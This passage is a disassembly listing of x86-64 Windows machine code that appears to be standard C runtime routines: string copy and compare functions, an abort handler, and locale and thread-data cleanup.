   1400063e8:	48 8d 0d 39 3b 01 00 	lea    0x13b39(%rip),%rcx        # 0x140019f28
   1400063ef:	e8 04 ff ff ff       	call   0x1400062f8
   1400063f4:	b0 01                	mov    $0x1,%al
   1400063f6:	48 83 c4 28          	add    $0x28,%rsp
   1400063fa:	c3                   	ret
   1400063fb:	cc                   	int3
   1400063fc:	48 83 ec 28          	sub    $0x28,%rsp
   140006400:	e8 77 f5 ff ff       	call   0x14000597c
   140006405:	b0 01                	mov    $0x1,%al
   140006407:	48 83 c4 28          	add    $0x28,%rsp
   14000640b:	c3                   	ret
   14000640c:	40 53                	rex push %rbx
   14000640e:	48 83 ec 20          	sub    $0x20,%rsp
   140006412:	48 8b 1d 27 2c 01 00 	mov    0x12c27(%rip),%rbx        # 0x140019040
   140006419:	48 8b cb             	mov    %rbx,%rcx
   14000641c:	e8 67 0c 00 00       	call   0x140007088
   140006421:	48 8b cb             	mov    %rbx,%rcx
   140006424:	e8 d7 39 00 00       	call   0x140009e00
   140006429:	48 8b cb             	mov    %rbx,%rcx
   14000642c:	e8 bf 3a 00 00       	call   0x140009ef0
   140006431:	48 8b cb             	mov    %rbx,%rcx
   140006434:	e8 4b ef ff ff       	call   0x140005384
   140006439:	48 8b cb             	mov    %rbx,%rcx
   14000643c:	e8 07 f9 ff ff       	call   0x140005d48
   140006441:	b0 01                	mov    $0x1,%al
   140006443:	48 83 c4 20          	add    $0x20,%rsp
   140006447:	5b                   	pop    %rbx
   140006448:	c3                   	ret
   140006449:	cc                   	int3
   14000644a:	cc                   	int3
   14000644b:	cc                   	int3
   14000644c:	33 c9                	xor    %ecx,%ecx
   14000644e:	e9 4d b8 ff ff       	jmp    0x140001ca0
   140006453:	cc                   	int3
   140006454:	40 53                	rex push %rbx
   140006456:	48 83 ec 20          	sub    $0x20,%rsp
   14000645a:	48 8b 0d f7 3a 01 00 	mov    0x13af7(%rip),%rcx        # 0x140019f58
   140006461:	83 c8 ff             	or     $0xffffffff,%eax
   140006464:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   140006468:	83 f8 01             	cmp    $0x1,%eax
   14000646b:	75 1f                	jne    0x14000648c
   14000646d:	48 8b 0d e4 3a 01 00 	mov    0x13ae4(%rip),%rcx        # 0x140019f58
   140006474:	48 8d 1d 45 2c 01 00 	lea    0x12c45(%rip),%rbx        # 0x1400190c0
   14000647b:	48 3b cb             	cmp    %rbx,%rcx
   14000647e:	74 0c                	je     0x14000648c
   140006480:	e8 67 10 00 00       	call   0x1400074ec
   140006485:	48 89 1d cc 3a 01 00 	mov    %rbx,0x13acc(%rip)        # 0x140019f58
   14000648c:	b0 01                	mov    $0x1,%al
   14000648e:	48 83 c4 20          	add    $0x20,%rsp
   140006492:	5b                   	pop    %rbx
   140006493:	c3                   	ret
   140006494:	48 8d 15 75 a1 00 00 	lea    0xa175(%rip),%rdx        # 0x140010610
   14000649b:	48 8d 0d 6e a0 00 00 	lea    0xa06e(%rip),%rcx        # 0x140010510
   1400064a2:	e9 7d 38 00 00       	jmp    0x140009d24
   1400064a7:	cc                   	int3
   1400064a8:	48 83 ec 28          	sub    $0x28,%rsp
   1400064ac:	84 c9                	test   %cl,%cl
   1400064ae:	74 16                	je     0x1400064c6
   1400064b0:	48 83 3d 08 43 01 00 	cmpq   $0x0,0x14308(%rip)        # 0x14001a7c0
   1400064b7:	00 
   1400064b8:	74 05                	je     0x1400064bf
   1400064ba:	e8 0d 40 00 00       	call   0x14000a4cc
   1400064bf:	b0 01                	mov    $0x1,%al
   1400064c1:	48 83 c4 28          	add    $0x28,%rsp
   1400064c5:	c3                   	ret
   1400064c6:	48 8d 15 43 a1 00 00 	lea    0xa143(%rip),%rdx        # 0x140010610
   1400064cd:	48 8d 0d 3c a0 00 00 	lea    0xa03c(%rip),%rcx        # 0x140010510
   1400064d4:	48 83 c4 28          	add    $0x28,%rsp
   1400064d8:	e9 db 38 00 00       	jmp    0x140009db8
   1400064dd:	cc                   	int3
   1400064de:	cc                   	int3
   1400064df:	cc                   	int3
   1400064e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400064e4:	e8 2b 06 00 00       	call   0x140006b14
   1400064e9:	48 8b 40 18          	mov    0x18(%rax),%rax
   1400064ed:	48 85 c0             	test   %rax,%rax
   1400064f0:	74 12                	je     0x140006504
   1400064f2:	49 ba 70 48 da 56 96 	movabs $0x85f13e9656da4870,%r10
   1400064f9:	3e f1 85 
   1400064fc:	ff 15 66 8d 00 00    	call   *0x8d66(%rip)        # 0x14000f268
   140006502:	eb 00                	jmp    0x140006504
   140006504:	e8 7f 00 00 00       	call   0x140006588
   140006509:	90                   	nop
   14000650a:	cc                   	int3
   14000650b:	cc                   	int3
   14000650c:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%rsp)
   140006513:	00 
   140006514:	8b 44 24 10          	mov    0x10(%rsp),%eax
   140006518:	e9 cf 0f 00 00       	jmp    0x1400074ec
   14000651d:	cc                   	int3
   14000651e:	cc                   	int3
   14000651f:	cc                   	int3
   140006520:	e9 97 2c 00 00       	jmp    0x1400091bc
   140006525:	cc                   	int3
   140006526:	cc                   	int3
   140006527:	cc                   	int3
   140006528:	40 53                	rex push %rbx
   14000652a:	48 83 ec 20          	sub    $0x20,%rsp
   14000652e:	33 db                	xor    %ebx,%ebx
   140006530:	48 85 c9             	test   %rcx,%rcx
   140006533:	74 0c                	je     0x140006541
   140006535:	48 85 d2             	test   %rdx,%rdx
   140006538:	74 07                	je     0x140006541
   14000653a:	4d 85 c0             	test   %r8,%r8
   14000653d:	75 1b                	jne    0x14000655a
   14000653f:	88 19                	mov    %bl,(%rcx)
   140006541:	e8 0e 0f 00 00       	call   0x140007454
   140006546:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000654b:	89 18                	mov    %ebx,(%rax)
   14000654d:	e8 aa 0c 00 00       	call   0x1400071fc
   140006552:	8b c3                	mov    %ebx,%eax
   140006554:	48 83 c4 20          	add    $0x20,%rsp
   140006558:	5b                   	pop    %rbx
   140006559:	c3                   	ret
   14000655a:	4c 8b c9             	mov    %rcx,%r9
   14000655d:	4c 2b c1             	sub    %rcx,%r8
   140006560:	43 8a 04 08          	mov    (%r8,%r9,1),%al
   140006564:	41 88 01             	mov    %al,(%r9)
   140006567:	49 ff c1             	inc    %r9
   14000656a:	84 c0                	test   %al,%al
   14000656c:	74 e4                	je     0x140006552
   14000656e:	48 83 ea 01          	sub    $0x1,%rdx
   140006572:	75 ec                	jne    0x140006560
   140006574:	48 85 d2             	test   %rdx,%rdx
   140006577:	75 d9                	jne    0x140006552
   140006579:	88 19                	mov    %bl,(%rcx)
   14000657b:	e8 d4 0e 00 00       	call   0x140007454
   140006580:	bb 22 00 00 00       	mov    $0x22,%ebx
   140006585:	eb c4                	jmp    0x14000654b
   140006587:	cc                   	int3
   140006588:	48 83 ec 28          	sub    $0x28,%rsp
   14000658c:	e8 2f 39 00 00       	call   0x140009ec0
   140006591:	48 85 c0             	test   %rax,%rax
   140006594:	74 0a                	je     0x1400065a0
   140006596:	b9 16 00 00 00       	mov    $0x16,%ecx
   14000659b:	e8 70 39 00 00       	call   0x140009f10
   1400065a0:	f6 05 f9 2a 01 00 02 	testb  $0x2,0x12af9(%rip)        # 0x1400190a0
   1400065a7:	74 2a                	je     0x1400065d3
   1400065a9:	b9 17 00 00 00       	mov    $0x17,%ecx
   1400065ae:	ff 15 bc 8a 00 00    	call   *0x8abc(%rip)        # 0x14000f070
   1400065b4:	85 c0                	test   %eax,%eax
   1400065b6:	74 07                	je     0x1400065bf
   1400065b8:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400065bd:	cd 29                	int    $0x29
   1400065bf:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400065c5:	ba 15 00 00 40       	mov    $0x40000015,%edx
   1400065ca:	41 8d 48 02          	lea    0x2(%r8),%ecx
   1400065ce:	e8 59 09 00 00       	call   0x140006f2c
   1400065d3:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400065d8:	e8 93 f7 ff ff       	call   0x140005d70
   1400065dd:	cc                   	int3
   1400065de:	cc                   	int3
   1400065df:	cc                   	int3
   1400065e0:	e9 8f 0e 00 00       	jmp    0x140007474
   1400065e5:	cc                   	int3
   1400065e6:	cc                   	int3
   1400065e7:	cc                   	int3
   1400065e8:	cc                   	int3
   1400065e9:	cc                   	int3
   1400065ea:	cc                   	int3
   1400065eb:	cc                   	int3
   1400065ec:	cc                   	int3
   1400065ed:	cc                   	int3
   1400065ee:	cc                   	int3
   1400065ef:	cc                   	int3
   1400065f0:	40 57                	rex push %rdi
   1400065f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400065f6:	48 83 39 00          	cmpq   $0x0,(%rcx)
   1400065fa:	48 8b f9             	mov    %rcx,%rdi
   1400065fd:	75 49                	jne    0x140006648
   1400065ff:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140006604:	ff 15 86 8a 00 00    	call   *0x8a86(%rip)        # 0x14000f090
   14000660a:	80 7f 10 00          	cmpb   $0x0,0x10(%rdi)
   14000660e:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140006612:	75 0c                	jne    0x140006620
   140006614:	33 d2                	xor    %edx,%edx
   140006616:	c6 47 10 01          	movb   $0x1,0x10(%rdi)
   14000661a:	48 89 57 08          	mov    %rdx,0x8(%rdi)
   14000661e:	eb 04                	jmp    0x140006624
   140006620:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   140006624:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140006629:	e8 26 07 00 00       	call   0x140006d54
   14000662e:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140006632:	48 8b d8             	mov    %rax,%rbx
   140006635:	48 89 07             	mov    %rax,(%rdi)
   140006638:	ff 15 5a 8a 00 00    	call   *0x8a5a(%rip)        # 0x14000f098
   14000663e:	48 85 db             	test   %rbx,%rbx
   140006641:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140006646:	74 09                	je     0x140006651
   140006648:	48 8b 07             	mov    (%rdi),%rax
   14000664b:	48 83 c4 20          	add    $0x20,%rsp
   14000664f:	5f                   	pop    %rdi
   140006650:	c3                   	ret
   140006651:	e8 32 ff ff ff       	call   0x140006588
   140006656:	cc                   	int3
   140006657:	cc                   	int3
   140006658:	cc                   	int3
   140006659:	cc                   	int3
   14000665a:	cc                   	int3
   14000665b:	cc                   	int3
   14000665c:	cc                   	int3
   14000665d:	cc                   	int3
   14000665e:	cc                   	int3
   14000665f:	cc                   	int3
   140006660:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006665:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000666a:	57                   	push   %rdi
   14000666b:	48 83 ec 20          	sub    $0x20,%rsp
   14000666f:	48 8b f9             	mov    %rcx,%rdi
   140006672:	e8 79 ff ff ff       	call   0x1400065f0
   140006677:	48 8d 57 18          	lea    0x18(%rdi),%rdx
   14000667b:	48 8b c8             	mov    %rax,%rcx
   14000667e:	48 8b f0             	mov    %rax,%rsi
   140006681:	4c 8b 80 90 00 00 00 	mov    0x90(%rax),%r8
   140006688:	4c 89 02             	mov    %r8,(%rdx)
   14000668b:	4c 8b 80 88 00 00 00 	mov    0x88(%rax),%r8
   140006692:	4c 89 47 20          	mov    %r8,0x20(%rdi)
   140006696:	4c 8b 47 08          	mov    0x8(%rdi),%r8
   14000669a:	e8 fd 3f 00 00       	call   0x14000a69c
   14000669f:	4c 8b 47 08          	mov    0x8(%rdi),%r8
   1400066a3:	48 8d 57 20          	lea    0x20(%rdi),%rdx
   1400066a7:	48 8b ce             	mov    %rsi,%rcx
   1400066aa:	e8 59 40 00 00       	call   0x14000a708
   1400066af:	8b 86 a8 03 00 00    	mov    0x3a8(%rsi),%eax
   1400066b5:	a8 02                	test   $0x2,%al
   1400066b7:	75 0d                	jne    0x1400066c6
   1400066b9:	83 c8 02             	or     $0x2,%eax
   1400066bc:	89 86 a8 03 00 00    	mov    %eax,0x3a8(%rsi)
   1400066c2:	c6 47 28 02          	movb   $0x2,0x28(%rdi)
   1400066c6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400066cb:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400066d0:	48 83 c4 20          	add    $0x20,%rsp
   1400066d4:	5f                   	pop    %rdi
   1400066d5:	c3                   	ret
   1400066d6:	cc                   	int3
   1400066d7:	cc                   	int3
   1400066d8:	cc                   	int3
   1400066d9:	cc                   	int3
   1400066da:	cc                   	int3
   1400066db:	cc                   	int3
   1400066dc:	cc                   	int3
   1400066dd:	cc                   	int3
   1400066de:	cc                   	int3
   1400066df:	cc                   	int3
   1400066e0:	cc                   	int3
   1400066e1:	cc                   	int3
   1400066e2:	cc                   	int3
   1400066e3:	cc                   	int3
   1400066e4:	cc                   	int3
   1400066e5:	cc                   	int3
   1400066e6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400066ed:	00 00 00 
   1400066f0:	48 2b d1             	sub    %rcx,%rdx
   1400066f3:	4d 85 c0             	test   %r8,%r8
   1400066f6:	74 6a                	je     0x140006762
   1400066f8:	f7 c1 07 00 00 00    	test   $0x7,%ecx
   1400066fe:	74 1d                	je     0x14000671d
   140006700:	0f b6 01             	movzbl (%rcx),%eax
   140006703:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   140006706:	75 5d                	jne    0x140006765
   140006708:	48 ff c1             	inc    %rcx
   14000670b:	49 ff c8             	dec    %r8
   14000670e:	74 52                	je     0x140006762
   140006710:	84 c0                	test   %al,%al
   140006712:	74 4e                	je     0x140006762
   140006714:	48 f7 c1 07 00 00 00 	test   $0x7,%rcx
   14000671b:	75 e3                	jne    0x140006700
   14000671d:	49 bb 80 80 80 80 80 	movabs $0x8080808080808080,%r11
   140006724:	80 80 80 
   140006727:	49 ba ff fe fe fe fe 	movabs $0xfefefefefefefeff,%r10
   14000672e:	fe fe fe 
   140006731:	8d 04 0a             	lea    (%rdx,%rcx,1),%eax
   140006734:	25 ff 0f 00 00       	and    $0xfff,%eax
   140006739:	3d f8 0f 00 00       	cmp    $0xff8,%eax
   14000673e:	77 c0                	ja     0x140006700
   140006740:	48 8b 01             	mov    (%rcx),%rax
   140006743:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   140006747:	75 b7                	jne    0x140006700
   140006749:	48 83 c1 08          	add    $0x8,%rcx
   14000674d:	49 83 e8 08          	sub    $0x8,%r8
   140006751:	76 0f                	jbe    0x140006762
   140006753:	4d 8d 0c 02          	lea    (%r10,%rax,1),%r9
   140006757:	48 f7 d0             	not    %rax
   14000675a:	49 23 c1             	and    %r9,%rax
   14000675d:	49 85 c3             	test   %rax,%r11
   140006760:	74 cf                	je     0x140006731
   140006762:	33 c0                	xor    %eax,%eax
   140006764:	c3                   	ret
   140006765:	48 1b c0             	sbb    %rax,%rax
   140006768:	48 83 c8 01          	or     $0x1,%rax
   14000676c:	c3                   	ret
   14000676d:	cc                   	int3
   14000676e:	cc                   	int3
   14000676f:	cc                   	int3
   140006770:	4d 85 c0             	test   %r8,%r8
   140006773:	75 18                	jne    0x14000678d
   140006775:	33 c0                	xor    %eax,%eax
   140006777:	c3                   	ret
   140006778:	0f b7 01             	movzwl (%rcx),%eax
   14000677b:	66 85 c0             	test   %ax,%ax
   14000677e:	74 13                	je     0x140006793
   140006780:	66 3b 02             	cmp    (%rdx),%ax
   140006783:	75 0e                	jne    0x140006793
   140006785:	48 83 c1 02          	add    $0x2,%rcx
   140006789:	48 83 c2 02          	add    $0x2,%rdx
   14000678d:	49 83 e8 01          	sub    $0x1,%r8
   140006791:	75 e5                	jne    0x140006778
   140006793:	0f b7 01             	movzwl (%rcx),%eax
   140006796:	0f b7 0a             	movzwl (%rdx),%ecx
   140006799:	2b c1                	sub    %ecx,%eax
   14000679b:	c3                   	ret
   14000679c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400067a1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400067a6:	57                   	push   %rdi
   1400067a7:	48 83 ec 20          	sub    $0x20,%rsp
   1400067ab:	49 8b d9             	mov    %r9,%rbx
   1400067ae:	49 8b f8             	mov    %r8,%rdi
   1400067b1:	8b 0a                	mov    (%rdx),%ecx
   1400067b3:	e8 f0 20 00 00       	call   0x1400088a8
   1400067b8:	90                   	nop
   1400067b9:	48 8b 07             	mov    (%rdi),%rax
   1400067bc:	48 8b 08             	mov    (%rax),%rcx
   1400067bf:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   1400067c6:	f0 ff 00             	lock incl (%rax)
   1400067c9:	8b 0b                	mov    (%rbx),%ecx
   1400067cb:	e8 2c 21 00 00       	call   0x1400088fc
   1400067d0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400067d5:	48 83 c4 20          	add    $0x20,%rsp
   1400067d9:	5f                   	pop    %rdi
   1400067da:	c3                   	ret
   1400067db:	cc                   	int3
   1400067dc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400067e1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400067e6:	57                   	push   %rdi
   1400067e7:	48 83 ec 20          	sub    $0x20,%rsp
   1400067eb:	49 8b d9             	mov    %r9,%rbx
   1400067ee:	49 8b f8             	mov    %r8,%rdi
   1400067f1:	8b 0a                	mov    (%rdx),%ecx
   1400067f3:	e8 b0 20 00 00       	call   0x1400088a8
   1400067f8:	90                   	nop
   1400067f9:	48 8b 0f             	mov    (%rdi),%rcx
   1400067fc:	33 d2                	xor    %edx,%edx
   1400067fe:	48 8b 09             	mov    (%rcx),%rcx
   140006801:	e8 a6 02 00 00       	call   0x140006aac
   140006806:	90                   	nop
   140006807:	8b 0b                	mov    (%rbx),%ecx
   140006809:	e8 ee 20 00 00       	call   0x1400088fc
   14000680e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006813:	48 83 c4 20          	add    $0x20,%rsp
   140006817:	5f                   	pop    %rdi
   140006818:	c3                   	ret
   140006819:	cc                   	int3
   14000681a:	cc                   	int3
   14000681b:	cc                   	int3
   14000681c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006821:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006826:	57                   	push   %rdi
   140006827:	48 83 ec 20          	sub    $0x20,%rsp
   14000682b:	49 8b d9             	mov    %r9,%rbx
   14000682e:	49 8b f8             	mov    %r8,%rdi
   140006831:	8b 0a                	mov    (%rdx),%ecx
   140006833:	e8 70 20 00 00       	call   0x1400088a8
   140006838:	90                   	nop
   140006839:	48 8b 47 08          	mov    0x8(%rdi),%rax
   14000683d:	48 8b 10             	mov    (%rax),%rdx
   140006840:	48 8b 0f             	mov    (%rdi),%rcx
   140006843:	48 8b 12             	mov    (%rdx),%rdx
   140006846:	48 8b 09             	mov    (%rcx),%rcx
   140006849:	e8 5e 02 00 00       	call   0x140006aac
   14000684e:	90                   	nop
   14000684f:	8b 0b                	mov    (%rbx),%ecx
   140006851:	e8 a6 20 00 00       	call   0x1400088fc
   140006856:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000685b:	48 83 c4 20          	add    $0x20,%rsp
   14000685f:	5f                   	pop    %rdi
   140006860:	c3                   	ret
   140006861:	cc                   	int3
   140006862:	cc                   	int3
   140006863:	cc                   	int3
   140006864:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006869:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000686e:	57                   	push   %rdi
   14000686f:	48 83 ec 20          	sub    $0x20,%rsp
   140006873:	49 8b d9             	mov    %r9,%rbx
   140006876:	49 8b f8             	mov    %r8,%rdi
   140006879:	8b 0a                	mov    (%rdx),%ecx
   14000687b:	e8 28 20 00 00       	call   0x1400088a8
   140006880:	90                   	nop
   140006881:	48 8b 07             	mov    (%rdi),%rax
   140006884:	48 8b 08             	mov    (%rax),%rcx
   140006887:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   14000688e:	48 85 c9             	test   %rcx,%rcx
   140006891:	74 1e                	je     0x1400068b1
   140006893:	83 c8 ff             	or     $0xffffffff,%eax
   140006896:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   14000689a:	83 f8 01             	cmp    $0x1,%eax
   14000689d:	75 12                	jne    0x1400068b1
   14000689f:	48 8d 05 1a 28 01 00 	lea    0x1281a(%rip),%rax        # 0x1400190c0
   1400068a6:	48 3b c8             	cmp    %rax,%rcx
   1400068a9:	74 06                	je     0x1400068b1
   1400068ab:	e8 3c 0c 00 00       	call   0x1400074ec
   1400068b0:	90                   	nop
   1400068b1:	8b 0b                	mov    (%rbx),%ecx
   1400068b3:	e8 44 20 00 00       	call   0x1400088fc
   1400068b8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400068bd:	48 83 c4 20          	add    $0x20,%rsp
   1400068c1:	5f                   	pop    %rdi
   1400068c2:	c3                   	ret
   1400068c3:	cc                   	int3
   1400068c4:	40 55                	rex push %rbp
   1400068c6:	48 8b ec             	mov    %rsp,%rbp
   1400068c9:	48 83 ec 50          	sub    $0x50,%rsp
   1400068cd:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
   1400068d1:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   1400068d5:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400068d9:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   1400068dd:	ba 01 00 00 00       	mov    $0x1,%edx
   1400068e2:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   1400068e6:	b8 05 00 00 00       	mov    $0x5,%eax
   1400068eb:	89 45 20             	mov    %eax,0x20(%rbp)
   1400068ee:	89 45 28             	mov    %eax,0x28(%rbp)
   1400068f1:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   1400068f5:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400068f9:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   1400068fd:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140006901:	b8 04 00 00 00       	mov    $0x4,%eax
   140006906:	89 45 d0             	mov    %eax,-0x30(%rbp)
   140006909:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   14000690c:	48 8d 05 d5 3c 01 00 	lea    0x13cd5(%rip),%rax        # 0x14001a5e8
   140006913:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140006917:	89 51 28             	mov    %edx,0x28(%rcx)
   14000691a:	48 8d 0d 4f 9a 00 00 	lea    0x9a4f(%rip),%rcx        # 0x140010370
   140006921:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140006925:	48 89 08             	mov    %rcx,(%rax)
   140006928:	48 8d 0d 91 27 01 00 	lea    0x12791(%rip),%rcx        # 0x1400190c0
   14000692f:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140006933:	89 90 a8 03 00 00    	mov    %edx,0x3a8(%rax)
   140006939:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   14000693d:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   140006944:	8d 4a 42             	lea    0x42(%rdx),%ecx
   140006947:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   14000694b:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   14000694f:	66 89 88 bc 00 00 00 	mov    %cx,0xbc(%rax)
   140006956:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   14000695a:	66 89 88 c2 01 00 00 	mov    %cx,0x1c2(%rax)
   140006961:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140006965:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140006969:	48 83 a0 a0 03 00 00 	andq   $0x0,0x3a0(%rax)
   140006970:	00 
   140006971:	e8 26 fe ff ff       	call   0x14000679c
   140006976:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   14000697a:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   14000697e:	48 8d 55 d4          	lea    -0x2c(%rbp),%rdx
   140006982:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140006986:	e8 91 fe ff ff       	call   0x14000681c
   14000698b:	48 83 c4 50          	add    $0x50,%rsp
   14000698f:	5d                   	pop    %rbp
   140006990:	c3                   	ret
   140006991:	cc                   	int3
   140006992:	cc                   	int3
   140006993:	cc                   	int3
   140006994:	48 85 c9             	test   %rcx,%rcx
   140006997:	74 1a                	je     0x1400069b3
   140006999:	53                   	push   %rbx
   14000699a:	48 83 ec 20          	sub    $0x20,%rsp
   14000699e:	48 8b d9             	mov    %rcx,%rbx
   1400069a1:	e8 0e 00 00 00       	call   0x1400069b4
   1400069a6:	48 8b cb             	mov    %rbx,%rcx
   1400069a9:	e8 3e 0b 00 00       	call   0x1400074ec
   1400069ae:	48 83 c4 20          	add    $0x20,%rsp
   1400069b2:	5b                   	pop    %rbx
   1400069b3:	c3                   	ret
   1400069b4:	40 55                	rex push %rbp
   1400069b6:	48 8b ec             	mov    %rsp,%rbp
   1400069b9:	48 83 ec 40          	sub    $0x40,%rsp
   1400069bd:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   1400069c1:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   1400069c5:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400069c9:	48 8d 15 a0 99 00 00 	lea    0x99a0(%rip),%rdx        # 0x140010370
   1400069d0:	b8 05 00 00 00       	mov    $0x5,%eax
   1400069d5:	89 45 20             	mov    %eax,0x20(%rbp)
   1400069d8:	89 45 28             	mov    %eax,0x28(%rbp)
   1400069db:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   1400069df:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400069e3:	b8 04 00 00 00       	mov    $0x4,%eax
   1400069e8:	89 45 e0             	mov    %eax,-0x20(%rbp)
   1400069eb:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   1400069ee:	48 8b 01             	mov    (%rcx),%rax
   1400069f1:	48 3b c2             	cmp    %rdx,%rax
   1400069f4:	74 0c                	je     0x140006a02
   1400069f6:	48 8b c8             	mov    %rax,%rcx
   1400069f9:	e8 ee 0a 00 00       	call   0x1400074ec
   1400069fe:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140006a02:	48 8b 49 70          	mov    0x70(%rcx),%rcx
   140006a06:	e8 e1 0a 00 00       	call   0x1400074ec
   140006a0b:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140006a0f:	48 8b 49 58          	mov    0x58(%rcx),%rcx
   140006a13:	e8 d4 0a 00 00       	call   0x1400074ec
   140006a18:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140006a1c:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   140006a20:	e8 c7 0a 00 00       	call   0x1400074ec
   140006a25:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140006a29:	48 8b 49 68          	mov    0x68(%rcx),%rcx
   140006a2d:	e8 ba 0a 00 00       	call   0x1400074ec
   140006a32:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140006a36:	48 8b 49 48          	mov    0x48(%rcx),%rcx
   140006a3a:	e8 ad 0a 00 00       	call   0x1400074ec
   140006a3f:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140006a43:	48 8b 49 50          	mov    0x50(%rcx),%rcx
   140006a47:	e8 a0 0a 00 00       	call   0x1400074ec
   140006a4c:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140006a50:	48 8b 49 78          	mov    0x78(%rcx),%rcx
   140006a54:	e8 93 0a 00 00       	call   0x1400074ec
   140006a59:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140006a5d:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140006a64:	e8 83 0a 00 00       	call   0x1400074ec
   140006a69:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140006a6d:	48 8b 89 c0 03 00 00 	mov    0x3c0(%rcx),%rcx
   140006a74:	e8 73 0a 00 00       	call   0x1400074ec
   140006a79:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   140006a7d:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140006a81:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   140006a85:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140006a89:	e8 d6 fd ff ff       	call   0x140006864
   140006a8e:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   140006a92:	4c 8d 45 f8          	lea    -0x8(%rbp),%r8
   140006a96:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   140006a9a:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140006a9e:	e8 39 fd ff ff       	call   0x1400067dc
   140006aa3:	48 83 c4 40          	add    $0x40,%rsp
   140006aa7:	5d                   	pop    %rbp
   140006aa8:	c3                   	ret
   140006aa9:	cc                   	int3
   140006aaa:	cc                   	int3
   140006aab:	cc                   	int3
   140006aac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006ab1:	57                   	push   %rdi
   140006ab2:	48 83 ec 20          	sub    $0x20,%rsp
   140006ab6:	48 8b f9             	mov    %rcx,%rdi
   140006ab9:	48 8b da             	mov    %rdx,%rbx
   140006abc:	48 8b 89 90 00 00 00 	mov    0x90(%rcx),%rcx
   140006ac3:	48 85 c9             	test   %rcx,%rcx
   140006ac6:	74 2c                	je     0x140006af4
   140006ac8:	e8 ab 2b 00 00       	call   0x140009678
   140006acd:	48 8b 8f 90 00 00 00 	mov    0x90(%rdi),%rcx
   140006ad4:	48 3b 0d 0d 3b 01 00 	cmp    0x13b0d(%rip),%rcx        # 0x14001a5e8
